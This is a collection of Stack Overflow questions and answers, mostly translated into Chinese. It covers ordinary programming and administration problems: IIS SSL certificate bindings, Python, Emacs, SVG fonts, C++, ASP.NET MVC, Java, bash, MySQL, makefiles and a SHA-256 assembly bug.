为了解决这个问题，我做了以下

1.  `netsh http delete sslcert ipport=[::]:443`
2.  `iisreset /restart`

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-04-08T08:35:28.453

与@IsolatedStorage 的答案非常相似，但提供了更多帮助我的细节。

首先，对您来说可能相同的几点

*   我试图更新证书，因为它已过期。
*   我有多个域绑定到同一个 IP。它们恰好是 SAN 证书，但这可能无关紧要。
*   我试图使用集中式证书存储。我再次认为这与我的大部分答案无关。
*   我已经尝试更新证书，但它没有显示新日期。
*   如果您的旧证书已经过期，您现在可能会感到恐慌。深吸一口气……

首先，我强烈建议您去`https://www.digicert.com/help/`下载他们的 DigiCert 工具。您也可以在线使用它。

输入您的网站`https://example.com`，它会显示到期日期和指纹（MS 称之为证书哈希）。它会进行实时查找，因此您不必担心您的浏览器（或中间服务器）是否正在缓存某些内容。

如果您使用的是集中式证书存储，您需要 100% 确定 .pfx 文件是最新版本，因此请转到您的存储目录并运行以下命令：

```
C:\WEBSITES\SSL> certutil -dump www.example.com.pfx 
```

这将向您显示到期日期和哈希/指纹。显然，如果这个到期日期是错误的，你可能只是将错误的证书导出到文件系统，所以先去修复它。

如果您使用的是 CCS，那么假设此 certutil 命令为您提供了（更新的证书的）预期到期日期，您可以继续。

运行命令：

```
netsh http show sslcert > c:\temp\certlog.txt
notepad c:\temp\certlog.txt 
```

您可能在这里有很多东西，因此在文本编辑器中打开它更容易。

您需要在此文件中搜索您从中获得的 WRONG 哈希`digicert.com`（或您从 Chrome 获得的指纹）。

对我来说，这产生了以下结果。你会看到它绑定到一个 IP 而不是我预期的域名。这就是问题。似乎这（无论出于何种原因我不确定）优先于我刚刚更新的 IIS 中的绑定集`example.com`。

```
IP:port                      : 10.0.0.1:443
Certificate Hash             : d4a17e3b57e48c1166f18394a819edf770459ac8
Application ID               : {4dc3e181-e14b-4a21-b022-59fc669b0914}
Certificate Store Name       : My
Verify Client Certificate Revocation : Enabled
Verify Revocation Using Cached Client Certificate Only : Disabled
Usage Check                  : Enabled
Revocation Freshness Time    : 0
URL Retrieval Timeout        : 0
Ctl Identifier               : (null)
Ctl Store Name               : (null)
DS Mapper Usage              : Disabled
Negotiate Client Certificate : Disabled 
```

我什至不知道这个绑定是从哪里来的——我的默认站点上什至没有任何 SSL 绑定，但这个服务器已经有几年历史了，我认为有些东西已经损坏并卡住了。

所以你会想要删除它。

为了安全起见，您需要先运行以下命令，以确保您只删除此一项：

```
C:\Windows\system32>netsh http show sslcert ipport=10.0.0.1:443

SSL Certificate bindings:
-------------------------

IP:port                      : 10.0.0.1:443
Certificate Hash             : d4a17e3b57e48c1166f18394a819edf770459ac8
Application ID               : {4dc3e181-e14b-4a21-b022-59fc669b0914}
Certificate Store Name       : My
Verify Client Certificate Revocation : Enabled
Verify Revocation Using Cached Client Certificate Only : Disabled
Usage Check                  : Enabled
Revocation Freshness Time    : 0
URL Retrieval Timeout        : 0
Ctl Identifier               : (null)
Ctl Store Name               : (null)
DS Mapper Usage              : Disabled
Negotiate Client Certificate : Disabled 
```

现在我们已经验证了这是“坏”指纹，我们可以使用以下命令将其删除预期的单个记录：

```
C:\Windows\system32>netsh http delete sslcert ipport=10.0.0.1:443

SSL Certificate successfully deleted 
```

希望如果您现在返回 Digicert 并重新运行该命令，它将为您提供预期的证书指纹。如果您有任何名称，您应该检查所有 SAN 名称。

可能想在这里进行IISRESET，以确保以后不会有任何意外。

最后说明：如果您正在使用集中式证书存储并且您看到不稳定的行为，甚至试图确定它是否从那里获取您的证书，请不要担心 - 这不是您的错。它似乎有时会立即获取新文件，但会缓存旧文件。在进行任何类型的更改后打开并重新保存 SSL 绑定似乎会重置它，但不是 100% 的时间。

祝你好运 ：-）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-05-19T13:50:42.627

相同的症状

将下拉列表中的 HTTPS 绑定更改为服务器 IP（在站点绑定对话框中）。它被设置为“全部未分配”收到关于覆盖现有证书/IP 组合的警告，我接受了，并且问题已解决。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-11-05T23:47:34.100

验证您在 IIS 中的每个绑定也只有一个站点集。

如果安装了默认站点和单独的站点，则它们可能都在同一端口上具有 HTTPS 绑定。如果发生这种情况，则提供的证书可能是来自其他站点的证书。

# javascript - 使用javascript“继续”单击“不可信”SSL证书

> ID：12866121
> 
> 赞同：1
> 
> 时间：2012-10-12T19:51:37.050
> 
> 标签：javascript, google-chrome, google-chrome-extension, ssl-certificate

**当站点的安全证书不受信任**时，是否可以使用 javascript .click()“继续” ！页面出现？我正在尝试自动化一些在我们的生产环境以及 dev/qa 环境中工作的测试。我遇到的问题是在开发环境中，证书用于错误的子域。

我读过我可以导入证书，但我正在寻找可以写入测试或作为 Chrome 扩展程序编写的东西。这样一来，它将仅限于我们信任的少数子域，而外部则没有。我倾向于扩展，因为 manifest.json 可以很容易地限制您允许的域。

我需要一个关于如何调用我假设是包含文本**继续**的按钮元素的点击的建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T19:52:35.197

这是不可能的。关键是浏览器希望用户决定是否信任该页面

# python - 如何修复这个 Python 脚本？

> ID：12866132
> 
> 赞同：1
> 
> 时间：2012-10-12T19:52:00.637
> 
> 标签：python, cvs2svn

我正在尝试使用 cvs2svn 将 CVS 存储库转换为 Git，并按照[此页面上](http://cvs2svn.tigris.org/cvs2git.html)的说明进行操作。我到了第 7 步，但运行 git-move-refs.py 时出错：

```
Traceback (most recent call last):
  File "../../cvs2svn-trunk/contrib/git-move-refs.py", line 23, in ?
    from subprocess import Popen, PIPE, call
ImportError: No module named subprocess 
```

作为参考，这是脚本显示的内容：

```
usage = 'USAGE: %prog [options]'

import sys
import optparse
from subprocess import Popen, PIPE, call 
```

我不是 Python 专家，但从浏览网页来看，subprocess 是一个标准模块，对吧？我正在使用从 2.6.3 版本的源代码构建的 Python 安装。我缺少什么让这个脚本工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:25:10.623

我猜你的发行版中有一个旧版本（pre-2.4）的 Python `/usr/bin/python`，而你编译的 Python 2.6 在其他地方（比如`/usr/local/bin/python`）。你之前的路径上有 Python 2.6 可执行文件`/usr/bin`，所以当你`python`从命令行执行时，你会得到 Python 2.6。

但是，查看[`cvs2svn`源代码，`git-move-refs.py`](http://cvs2svn.tigris.org/source/browse/cvs2svn/trunk/contrib/git-move-refs.py?revision=5382&view=markup)的[解释器行](https://en.wikipedia.org/wiki/Shebang_%28Unix%29)被硬编码为

```
#!/usr/bin/python 
```

而不是`#!/usr/bin/env python`，这意味着当您运行脚本时，它使用旧的 Python。

作为一种解决方法，通过将脚本传递给 Python 2.6 解释器来运行脚本：

```
user@host$ python /path/to/cvs2svn/contrib/git-move-refs.py 
```

# emacs - Extending c-mode, based on Java, how to tweak annotations?

> ID：12866136
> 
> 赞同：1
> 
> 时间：2012-10-12T19:52:33.730
> 
> 标签：emacs, syntax-highlighting

I'm working on modifying Haxe mode for Emacs. It is based on c-mode, Java language.

After this mode was created, the language introduced new construct, it is similar in style to Java annotations, except for one thing:

```
@:macro public function foo() { ... } 
```

is an annotation too. I.e. the part "@:macro" is an annotation, but c-mode treats the annotation as if it had to be "@" symbol followed by letters (once it sees ":", it thinks it's the end of the annotation).

What is the rule it is using for parsing annotations and how would I modify it?

Below is something that I've tried to do, but it neither works, nor am I sure it's the right way to do it.

```
(defadvice c-forward-annotation
  (around haxe-forward-annotation ())
  "Overrides `c-forward-annotation' to be able to use @:\w+ syntax as well
as the Java original syntax."
  (message "c-forward-annotation overloaded")
  (and (looking-at "@")
       (progn (forward-char) t)
       (if (looking-at ":")
           (progn
             (forward-char)
             (c-forward-type))
         (c-forward-type))
       (progn (c-forward-syntactic-ws) t)
       (if (looking-at "(")
           (c-go-list-forward)
         t))) 
```

The function seems to actually do the job properly, what doesn't work later is the `c-beginning-of-statement-1` - but it's too complex to find out what is actually happening...

One more thing I've tried:

```
(c-lang-defconst c-symbol-start
  haxe (concat "[" c-alpha "_@]:?")) 
```

but didn't help either. Even some more info: if I `C-c C-s` on the line containing `@:macro` I get `cpp-macro` syntax, which is so ironically close, but not what I need.

More info: by overriding `c-beginning-of-macro` I could make it believe it is not a `cpp-macro`, however it is still not recognized as annotation. I've also overridden the place in `c-forward-decl-or-cast-1` where it had a hardcoded regexp for testing for Java-style identifiers... still no go :(

Also changed in the `(c-lang-defconst c-basic-matchers-after ...)` to the below, but still no go...

```
,@(when (c-major-mode-is 'java-mode)
    `((eval . (list "\\<\\(@:?[a-zA-Z0-9]+\\)\\>" 1 c-annotation-face)))) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T12:06:41.533

我想我终于找到了！

```
(c-lang-defconst c-cpp-matchers
  haxe (append
        (c-lang-const c-cpp-matchers c)
        '(("\\<\\([A-Z][A-Za-z0-9_]*\\)\\>" 1 font-lock-type-face))
        '(("\\<\\(@:?[A-Za-z]+\\)\\>" 1 c-annotation-face)))) 
```

我必须添加最后一个匹配器正则表达式以使其识别元数据中的冒号。我仍然不确定我所做的其他更改以及其中任何更改对于完成它的最终更改的重要性，但肯定这是一个重要的更改。

# javascript - SVG doesn't render fonts in Firefox (works in IE9 and Chrome)

> ID：12866139
> 
> 赞同：6
> 
> 时间：2012-10-12T19:52:47.373
> 
> 标签：javascript, html, firefox, vector, svg

I've got vector logo in PSD file. When I export it as AI (Adobe Illustrator) file and then convert to SVG I get something like this:

```
<tspan
             x="0 34.799999 68.75"
             y="0"
             id="tspan22"
             style="font-size:50px;font-variant:normal;font-weight:bold;font-stretch:normal;writing-mode:lr-tb;fill:#000000;fill-opacity:1;fill-rule:nonzero;stroke:none;font-family:Novecento wide Book;-inkscape-font-specification:Novecentowide-Bold">AI</tspan> 
```

This is only a short part of full SVG file but you can see that it creates letters and attempts to use fonts. Which fails...

![enter image description here](../Images/ae28a85ce9bd51c22189d49e43e28fd3.png)

I rather want it to export SVG file as stand-alone vector that doesn't require any fonts. How can this be done?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T21:18:45.170

两种可能：

1.  假设 Firefox 无法识别整个字符串，请尝试在字体系列名称周围加上单引号，如下所示：

    `font-family:'Novecento wide Book';`

2.  在导出为 SVG 之前，尝试将 AI 或 PSD 中的文本转换为矢量/形状。这将消除对任何字体系列的依赖，这是一个考虑因素，特别是如果您打算在 Web 上发布它。应该这样完美地工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-05-20T16:15:41.987

右键单击 illustrator 等矢量程序中的文本，然后选择大纲文本。无论使用哪种浏览器，这都会保留您的字体。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-02-08T20:53:34.073

我在 IE11、Chrome 和 Firefox 中以这种方式使用了嵌入字体，没有任何问题：

```
<svg...>
    <text transform="matrix(1 0 0 1 52.1787 206.4395)" fill="#F7F7F7" font-family="'Roboto'" font-weight="400" font-size="16">Lorem Ipsum</text>
</svg> 
```

注意 font-family 属性是双引号的。这就是插画师的做法。请注意使用正确的字体名称。示例的 Illustrator 喜欢放置“'Roboto-Regular'”，这可能不是字体的正确名称

# c++ - 通过引用返回 std::Vector<> 很慢？

> ID：12866142
> 
> 赞同：0
> 
> 时间：2012-10-12T19:53:17.670
> 
> 标签：c++, vector, std

我已经对此进行了测试，与直接抓取成员相比，通过引用传递的速度大约是两倍。EG -

```
class Mesh {

    public:
        inline std::vector<Vector3>& GetVertices() { return m_vertices; }

    private:
        std::vector<Vector3> m_vertices;
}; 
```

如果我在每一帧都经常调用 GetVertices() 来获取顶点，那么它比直接访问 m_vertices 慢得多。但我想保持 m_vertices 私有。我能做些什么？

为什么它更慢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:01:40.907

编译器将内联该代码并将其转换为对成员的直接访问（在任何优化级别，除了：*我想运行缓慢*）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:04:26.837

有没有你没有展示的虚拟功能？也许`Mesh`是一个子类，而 GetVertices() 是一个通过基类调用的纯虚函数？这会稍微减慢速度。

如果可以的话，另一种可能性是返回*const*引用而不是非常量引用。

# ajax - 使用 MVC3 @Url.Action 的 JQuery 加载未正确传递参数

> ID：12866144
> 
> 赞同：8
> 
> 时间：2012-10-12T19:53:22.057
> 
> 标签：ajax, asp.net-mvc-3

我注意到这样做为`@Url.Action("myAction", new { param1 = 123, param2 = 456})`我提供了一个无效的 URL `Home/myAction?param1=123&amp;param2=456`。

我正在尝试做

```
$("#myAjaxDiv").load(url); 
```

但只有`param1`在 action 方法中填充。

当我删除`&amp;`并制作它时`&`它就可以工作，但是做一个字符串替换是超级hacky。

```
url = url.replace("&amp;", "&"); 
```

我在这里错过了什么吗？

*编辑：*根据请求，我将包含一些示例应用程序。（您可以创建一个新的 MVC 应用程序并快速添加这些并自己查看）

控制器：

```
public ActionResult AjaxTest(int? year, int? month)
{
    ViewBag.Message = string.Format("Year: {0}, Month: {1}", year.HasValue ? year.ToString() : "no year", month.HasValue ? month.ToString() : "no month");
    return PartialView("AjaxTest");
} 
```

AjaxTest 视图：

```
@ViewBag.Message 
```

索引视图：

```
<script>
    $(function () {
        var url="";
        $("#noParams").click(function () {
            url = "Home/AjaxTest";
            $("#ajaxy").load(url)
            $("#url").text(url);
        });
        $("#yearParam").click(function () {
            url = "Home/AjaxTest?year=2012";
            $("#ajaxy").load(url)
            $("#url").text(url);
        });
        $("#yearAndMonthParam").click(function () {
            url = "Home/AjaxTest?year=2012&month=10";
            $("#ajaxy").load(url)
            $("#url").text(url);
        });

        $("#generated").click(function () {
            url = "@(Url.Action("AjaxTest", new { year=2012, month=10}))";
            $("#ajaxy").load(url);
            $("#url").text(url);
        });

    });
</script>

<a id="noParams" href="#">No Params</a> <br />
<a id="yearParam" href="#">Year Param</a> <br />
<a id="yearAndMonthParam" href="#">Year and Month Param</a> <br />
<a id="generated" href="#">Generated</a> <br />
<div id="ajaxy">

</div>

<div>
URL: <span  id="url"></span>
</div> 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-10-12T20:12:34.527

默认情况下，使用块`IHtmlString`发出的每个[内容](http://weblogs.asp.net/scottgu/archive/2010/07/02/introducing-razor.aspx)（不是`@`

`Url.Action`返回只是一个普通的`string`，所以这就是为什么要`&`编码。

`Html.Raw`如果您不想要编码，请使用：

```
url = "@(Html.Raw(Url.Action("AjaxTest", new { year=2012, month=10})))"; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-12T20:05:11.940

您也可以通过这种方式构建 url。

```
var url = "@Url.Action("AjaxTest","YourControllerName")?year=2012&month=10";
$("#ajaxy").load(url); 
```

# c# - 路径中存在句点时未找到 ServiceStack 处理程序

> ID：12866145
> 
> 赞同：2
> 
> 时间：2012-10-12T19:53:25.007
> 
> 标签：c#, api, servicestack

当在路径中间使用电子邮件地址（存在句点）执行 GET 时，我们从 ServiceStack 收到错误消息“未找到请求的处理程序”。将路由的电子邮件地址部分移动到路径的最后一部分时，它是成功的。

*   **失败**“/path/to/me%40example.com/action”
*   **成功**“/path/to/action/me%40example.com”

我们已经能够通过将电子邮件地址保留在路径末尾来解决它，但是当有多个参数可能有句点时，我们必须依靠 POST 来完成调用。对解决方法有什么建议吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-13T11:45:31.660

ServiceStack 的 Routes 中有 2 个组件分隔符：`.` 和`/`，这是一个示例，显示了[ServiceStack 支持的不同 Route 路径](https://github.com/ServiceStack/ServiceStack/blob/master/tests/ServiceStack.ServiceHost.Tests/RestPathTests.cs#L99)。

您可以尝试对 url 进行编码，`.`否则`%2E`只需将操作添加为查询字符串参数，例如：`/path/to/me%40example.com?action=action`

# java - java.io.FileNotFoundException: in.txt, (系统找不到指定的文件)

> ID：12866146
> 
> 赞同：0
> 
> 时间：2012-10-12T19:53:34.643
> 
> 标签：java

我收到以下错误

```
java.io.FileNotFoundException: in.txt, (The system cannot find the file specified)
    at java.io.FileInputStream.open(Native Method)
    at java.io.FileInputStream.<init>(Unknown Source)
    at java.io.FileInputStream.<init>(Unknown Source)
    at java.io.FileReader.<init>(Unknown Source)
    at FileTest.main(FileTest.java:50) 
```

但是我确定我在 src、bin 和根目录下创建了一个 in.txt 文件。我还尝试在主要参数中指定完整目录，但仍然无法正常工作。为什么 Eclipse 不选择它？

```
import java.io.*;
public class FileTest {
    public static void main(String[] args) {

        try {
            String inFileName = args[0];
            String outFileName = args[1];
            BufferedReader ins = new BufferedReader(new FileReader(inFileName));
            BufferedReader con = new BufferedReader(new InputStreamReader(System.in));
            PrintWriter outs = new PrintWriter(new FileWriter(outFileName));

            String first = ins.readLine(); // read from file
            while (first != null) {
                System.out.print("Type in a word to follow " + first + ":");
                String second = con.readLine(); // read from console
                // append and write
                outs.println(first + ", " + second);
                first = ins.readLine(); // read from file
            }
            ins.close();
            outs.close();
        } catch (IOException ex) {
            ex.printStackTrace(System.err);
            System.exit(1);
        }

    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T20:01:04.083

鉴于错误消息，我猜 Java 正在寻找文件名`in.txt,`，后面带有逗号。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:02:40.977

默认情况下，Eclipse 会将工作目录设置为项目文件夹。如果您对设置进行了更改，您仍然可以通过这行简单的代码找到工作目录：

```
System.out.println(new java.io.File("").getAbsolutePath()); 
```

将您的文本文件放在打印的文件夹中，您应该没问题。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-12T20:02:57.983

我获取了您的代码并使用以下命令行参数执行了它：

```
in.txt out.txt 
```

它完全没有问题。检查你的命令行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T19:55:28.847

把它放在项目目录中，如果这不起作用，bin文件夹

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-12T20:00:56.447

打开“调试配置”并在“参数”选项卡下设置工作目录。相对路径将相对于工作目录。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-12T20:10:52.060

我在 eclipse 中创建了一个新项目`Learning`，并将`in.txt`文件放在源目录中。我使用示例 java 文件进行了测试。

```
public static void main(String[] args) {
    File f = new File("a.txt");
    System.out.println(f.getAbsolutePath());
} 
```

输出：

```
/home/bharathi/workspace/Learning/a.txt 
```

它在项目根目录中查找。您可以将 in.txt 放在项目的根目录中，或者提供直到 source directory 的路径。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-08-29T08:48:11.817

可能有两个问题：

1.  在您的控制台中，显示带有“，”的错误检查->
    java.io.FileNotFoundException：in.txt，
    因此JVM可能会查找带有“，”的文件名

2.  第二种情况可以，你的in.txt文件位置不对。检查它是否是项目的根。或主要路径。

这将解决这些类型的问题。

# linux - 将我的 bash 命令转换为 bashrc 函数并传递参数

> ID：12866148
> 
> 赞同：4
> 
> 时间：2012-10-12T19:53:52.283
> 
> 标签：linux, bash, shell, command

[感谢@ezod here](https://stackoverflow.com/a/12865286/318090)，我有一个很好的 bash 命令来查找文件和文件路径中的关键短语。我试图将它变成我的 bashrc 中的一个函数，但它不会产生相同的结果。我猜它与我需要转义或使用替代方法的背靠背大括号有关？

**作品：**

```
{ find . -name '*keyword*'; grep -irl 'keyword' .; } | sort -u 
```

**在 bashrc 中不起作用：**

```
function findit() {
  { find . -name '*$1*';
    grep -irl '$1' .;
  } | sort -u
}
export -f findit

$ findit keyword 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:00:25.473

Bash 不会用单引号替换变量。尝试这个：

```
function findit() {  
  { find . -name "*$1*";  
    grep -irl "$1" .;  
  } | sort -u  
}  
export -f findit 
```

# mysql - MYSQL 范围条件仅适用于索引列

> ID：12866149
> 
> 赞同：-1
> 
> 时间：2012-10-12T19:53:54.527
> 
> 标签：mysql, mysqldump

我正在执行以下查询以从我的表中获取每日用户登录详细信息。我发布了示例表和我正在执行的查询。

**问题**

我的查询没有执行，因为`range`它检查了整个表。它对我来说变得很慢。如果我索引时间戳列是没有用的，因为以毫秒为单位的时间戳没有重大差异。我无法为表的时间戳列建立索引，因为我的产品在生产设置中。它将包含数百万行。如何将此查询作为`range`一个或任何更好的解决方案执行？

**MYSQL 表** +---------------+-------------------------------------------- -------------------------------------------------- -------------------------------------------------- -------------------------------------------------- --+ | 表 | 创建表 |

```
+---------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| SignInDetails | CREATE TABLE `SignInDetails` (
  `USER_ID` bigint(20) DEFAULT NULL,
  `UserName` char(200) DEFAULT NULL,
  `TIMESTAMP` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 |
+---------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
```

**询问**

```
select USER_ID,TIMESTAMP from SignInDetails where TIMESTAMP 
between UNIX_TIMESTAMP(CURRENT_DATE()-INTERVAL 1 DAY)*1000 and 
UNIX_TIMESTAMP(CURRENT_DATE())*1000 
```

解释输出

```
 +----+-------------+---------------+------+---------------+------+---------+------+------+-------------+
| id | select_type | table         | type | possible_keys | key  | key_len | ref  | rows | Extra       |
+----+-------------+---------------+------+---------------+------+---------+------+------+-------------+
|  1 | SIMPLE      | SignInDetails | ALL  | NULL          | NULL | NULL    | NULL |   21 | Using where |
+----+-------------+---------------+------+---------------+------+---------+------+------+-------------+ 
```

**表中的总行数**

21

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:19:36.413

您的 desc 输出并不表示该`timestamp`列是索引列。您能否提供 DDL，以便我们可以看到您实际上为它创建了索引？

或者，您可以使用 2 列以毫秒分辨率存储时间戳，一个用于搜索，另一个用于额外分辨率。我可以想象组合：`datetime`/ `msec`，`date`/ `bigint-msec`，`datetime`/ `bigint-msec`。实际组合将取决于最常用的查询类型。

# sql - 连接上的mysql查询更新

> ID：12866152
> 
> 赞同：0
> 
> 时间：2012-10-12T19:54:07.657
> 
> 标签：sql

我正在尝试更新 table1 但它给了我错误

我有 3 个表加入。这是我的 sql

```
update `table1` 
set 
p.`status` = 0
from table1 t
left join
table2  p
on
p.id = t.id
join
table3 h
on
h.id =  p.id
WHERE p.`status`=1 AND h.id <>12"; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:01:04.130

错误的语法。在这里更正一下：

```
update `table1` t
left join
table2  p
on
p.id = t.id
join
table3 h
on
h.id =  p.id
set p.`status` = 0
WHERE p.`status`=1 AND h.id <>12"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:09:24.497

试试这个：

```
update `table2` p
left join `table1` t on
p.id = t.id join
table3 h on
h.id = p.id
set p.`status` = 0
WHERE p.`status`=1 AND h.id <>12 
```

您说的是更新 table1，但 p.status 是 table2。或者你有一个错字，它应该是 t.status。

# c++ - 仅在需要时编译文件

> ID：12866155
> 
> 赞同：0
> 
> 时间：2012-10-12T19:54:24.237
> 
> 标签：c++, build, makefile

我在目录中有几个 cpp 和 hpp 文件`./src`。我将所有 cpp 文件编译到一个二进制文件中，比如`./bin/run`. 我只想在需要时重新编译，即它或它的标题之一已更改。

我可能可以创建 Makefile，当且仅当文件被更改时才会重新编译文件，但这很不舒服，因为我的大部分代码都在标题中。（它不会改变，因为产品本身就是标头，而 cpp 文件是测试）。

我想将临时`.o`文件存储在`./build`

我知道`g++ -MM`功能，但我不确定如何使用它。

我很高兴看到使用不必要`make`但任何其他可能的系统的解决方案，如果它们足够简单的话。

**UPD** 我会试着澄清一下，问题是什么：

可能会创建新的 cpp，可能会添加或删除包含，等等。我不想每次都编辑我的 makefile。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T22:56:33.157

为了解决我提到的问题（`-include`不是一个好的解决方案），我使用这样的东西：

```
build/%.o: %.cpp
    @$(CC) -MD -c -Wall -o $@ $<
    @cp build/$*.d build/$*.P
    @sed -e 's/#.*//' -e 's/^[^:]*: *//' -e 's/ *\\$$//' \
         -e '/^$$/ d' -e 's/$$/ :/' < build/$*.P >> build/$*.d
    @rm build/$*.P

-include build/*.d 
```

不需要 `%.d 规则。

**编辑：**

@JackKelly 有 [ **cough*, *choke** ] 向我展示了一种更好的方法来有效地获取相同的依赖文件：

```
build/%.o: %.cpp
    @$(CC) -MD -c -Wall -o $@ $<
    @$(CC) -MM -MP -Wall -o $*.d $<

-include build/*.d 
```

是的，你可以对同一个目标有多个规则，只要其中一个有命令即可；先决条件积累。我们的想法是获取这样的文件：

```
file.o: file.cpp headerfile.h
headerfile.h: 
```

第二行 ( `headerfile.h:`) 是`headerfile.h`没有先决条件或命令的规则。它什么也不做，但它是一个规则，所以如果`headerfile.h`缺少，Make 会很满意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:18:38.070

解决方案的概要如下：

*   为每个源文件使用辅助依赖文件（即 create `foo.dep`for `foo.c`、`bar.dep`for`bar.c`等）
*   用于`gcc -MM`创建依赖文件
*   为了强制`make`自动执行此操作，请将and`foo.c`用作先决条件；这需要一些小的魔法输出`foo.dep``foo.o``sed``gcc -MM`
*   在主 makefile 中包含所有依赖文件；这是使这种方法成为可能的关键步骤。

最后一步写成如下：

```
-include $(dependency_files) 
```

这是非常棘手但可能的；有关更多信息，请参阅[GNU make 手册](http://www.gnu.org/software/make/manual/html_node/Include.html#Include)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T20:20:20.757

你提到`g++ -MM`，它可以做你想做的事情：

```
include $(ALLOBJ:%.o=%.d)

%.d: %.cxx
    @echo making dependencies for $<
    @g++ -MM -MP $(CXXFLAGS) $< -o $@
    @sed -i 's,$*\.o,& $@ ,g' $@ 
```

`.d`基本上，这定义了从文件创建文件的规则`.cxx`。`.d`反过来，该`include`语句需要这些`.o`文件，该语句要求`ALLOBJ`.

依赖规则的最后一行是“sed 魔法”，它使依赖文件自己重新生成。如果您认为正则表达式充其量只是 hack，而且通常是邪恶的，那么您可以[使用`-MT`flag](https://stackoverflow.com/a/12876363/915501)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T20:05:01.130

您可以使用 Make 执行此操作，您只需在规则的敏感度列表中指定标题。例如

```
myfile.o: myfile.cpp
    gcc -c myfile.o myfile.cpp ${LDFLAGS}    # This is optional. make can infer this line. 
```

变成

```
myfile.o: myfile.cpp myfile.h
    gcc -c myfile.o myfile.cpp ${LDFLAGS}    # Again, optional. 
```

现在，无论何时`myfile.h`发生变化，`myfile.cpp`都会重建。更多的标头可以以类似的方式链接起来。

# textmate - 视觉嵌套块

> ID：12866162
> 
> 赞同：1
> 
> 时间：2012-10-12T19:54:57.757
> 
> 标签：textmate, textmate2

有谁知道 textmate 是否有一种视觉方式来表示嵌套块？我刚开始使用咖啡脚本（它使用选项卡式嵌套），并认为有类似的东西会很棒：

[http://www.mathworks.com/help/matlab/matlab_prog/section_thirdlevel_highlight.png](http://www.mathworks.com/help/matlab/matlab_prog/section_thirdlevel_highlight.png)

是否有可能在 textmate 2 中编写一个在这些方面做一些事情的插件？

谢谢！

编辑：经过更多搜索后，我发现这有时被称为“缩进指南”。我仍然没有在 textmate 2 中找到任何方法来执行此操作，但 sublime text 默认情况下具有该功能。

# debugging - 调试 SHA-256 实现

> ID：12866168
> 
> 赞同：0
> 
> 时间：2012-10-12T19:55:12.733
> 
> 标签：debugging, assembly, sha256, masm32

我一直在使用 MASM32 进行 SHA-256 实现，并完成了一些源代码。但是，我无法让它正常工作，我查看了它，重写了它的一部分，并将一些源代码复制到内联的 Delphi ASM 中并让它完美运行，但我原来的 ASM 源代码有问题。鉴于我对此并没有非常丰富的经验，是否有人可以查看源代码并告诉我他们是否看到了我遗漏的东西？我已经做了一个 Delphi 实现并让它完美运行，所以我知道不是算法本身有问题，而是 ASM 代码本身有问题。

在我开始工作后，我正计划优化任务。但请记住，我仍在学习（自学），所以如果您在此来源中看到我所做的某些事情是愚蠢的，我也希望能够学习。但我主要关心的是让它工作，因为我没有看到错误在哪里。

（删除了空间问题的 ASM 代码，因为我现在知道问题所在）

**编辑：我想出了问题所在。这导致了下一个逻辑问题，因为我不知道：为什么这段代码会导致问题？**

在 SHA256Loop 宏的末尾更改以下内容：

```
ADD  h, ECX  
ADD  h, EBX  ; h := t1 + t2; 
```

对此：

```
ADD  ECX, EBX  ; h := t1 + t2;
MOV  h, ECX 
```

修复。为什么我不能对内存执行两条 ADD 指令并获得与 ADD 相同的结果到寄存器然后 MOV 到内存？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T02:21:42.890

您的第一个带有两条`ADD`指令的示例取决于`h`. 第二个例子独立于前面的内容`h`。如果`h`不保证 的值为零，则这两个示例的行为将有所不同。

# c# - 是否有 Java、C#、Python 或 Ruby 中的 Google Contacts API 的 Hello World 示例？

> ID：12866172
> 
> 赞同：14
> 
> 时间：2012-10-12T19:55:18.360
> 
> 标签：c#, java, ruby, google-api, google-contacts-api

**问题**

谁能指点我一步一步的例子来解释如何开始使用 Google Contacts API 并展示一个*完整的工作*演示？

最好使用 Java，但也可以使用 C#、Python 或 Ruby。

**目标**

我想做的就是

1.  加载现有联系人，
2.  将其添加到组中并
3.  保存联系人。

**问题**

我几乎在每个级别上都失败了。

*   无法使身份验证正常工作
*   找不到包含我在 Internet 上找到的代码片段中使用的类的库
*   无法对现有联系人执行 CRUD 操作

**例子**

这是我正在寻找的一些伪代码。

```
import com.google.contacts.*

public class UpdateContactDemo {

   public static void main(String args[]) {
      GoogleContactsApi g = new GoogleContactsApi("username", "password");
      Contact c = g.get("Bob");
      c.addGroup("Friends");
      g.save(c);
   }
} 
```

**我已经做过的**

